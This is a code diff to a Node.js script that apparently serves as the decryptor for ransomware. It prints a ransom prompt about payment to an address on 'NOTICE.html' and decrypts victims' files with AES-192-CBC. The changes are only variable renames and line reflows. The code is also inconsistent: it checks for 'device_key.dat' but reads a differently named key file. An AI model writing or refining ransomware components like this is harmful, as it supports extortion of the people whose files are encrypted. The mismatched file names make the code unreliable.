@@ -20,13 +20,11 @@ if (process.pkg) {
 }
 
 if (!existsSync(join(directory, 'device_key.dat'))) {
-	console.log(
-		'No decryption file found yet. Did you pay us using the address on NOTICE.html?'
-	);
+	console.log('No decryption file found yet. Did you pay us using the address on NOTICE.html?');
 	process.exit(1);
 }
 
-const deviceKey = Buffer.from(readFileSync(join(directory, 'deviceKey.dat')));
+const DEVICE_KEY = Buffer.from(readFileSync(join(directory, 'DEVICE_KEY.dat')));
 
 const files = readdirSync(directory);
 
@@ -51,14 +49,12 @@ for (let i = 0; i < files.length; i++) {
 	iv = join(directory, iv);
 	encrypted = join(directory, encrypted);
 
-	const ivData = Buffer.from(readFileSync(iv).toString(), 'hex');
+	const IV_DATA = Buffer.from(readFileSync(iv).toString(), 'hex');
 
-	const decipher = createDecipheriv('aes-192-cbc', deviceKey, ivData);
+	const decipher = createDecipheriv('aes-192-cbc', DEVICE_KEY, IV_DATA);
 
 	const input = createReadStream(encrypted);
-	const output = createWriteStream(
-		encrypted.split('.').slice(0, -1).join('.')
-	);
+	const output = createWriteStream(encrypted.split('.').slice(0, -1).join('.'));
 
 	input
 		.pipe(decipher)
